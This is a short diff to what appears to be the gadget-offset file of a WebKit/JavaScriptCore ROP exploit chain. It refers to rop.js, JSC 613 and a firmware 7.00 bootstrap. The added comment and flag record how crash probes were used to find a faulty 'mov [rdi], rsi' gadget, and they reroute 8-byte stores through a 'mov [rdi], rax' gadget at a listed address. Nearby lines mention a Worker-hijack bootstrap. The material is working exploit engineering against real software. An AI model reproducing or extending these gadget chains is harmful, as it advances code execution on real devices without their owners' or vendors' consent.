@@ -111,6 +111,19 @@ const OFFSET_wk_r9_zero_only             = true;
 // swapped.  ZF is unaffected by the swap, so branch_types.EQUAL (the only
 // type the engine uses) is exact; rop.js throws on the ordered types.
 const OFFSET_wk_cmp_operands_reversed    = true;
+/* `mov [rdi], rsi ; ret` at 0x7527F0 is NOT that instruction on this build.
+ * Established by execution, since the text is execute-only and cannot be read:
+ *   probe=rsp  SILENT -- pop rsp 0x6EEE1 and the stack switch both work
+ *   probe=p    SILENT -- pop rdi 0x31434 and pop rsi 0xB7098 each consume
+ *                        exactly one stack slot and return correctly
+ *   probe=w    CRASH  -- those same two pops PLUS this store, twice
+ * The store is the only difference between the last two, so 0x7527F0 is it.
+ * Route 8-byte stores through `mov [rdi], rax` 0x79337 instead. That one is
+ * cross-checked by its own neighbour: "mov [rdi], eax" is 0x79338, exactly one
+ * byte later, which is what `48 89 07 C3` vs `89 07 C3` looks like -- the same
+ * store with the REX prefix skipped. 0x7527F0 has no such corroboration.
+ * rop.js honours this in push_write8, push_copy8 and push_write_ptr8. */
+const OFFSET_wk_store_via_rax            = true;
 
 // --- 7.00 bootstrap: the idle-Worker hijack does not work on JSC 613 --------
 // The Worker never parks at a return address any stack scan can find (its wait
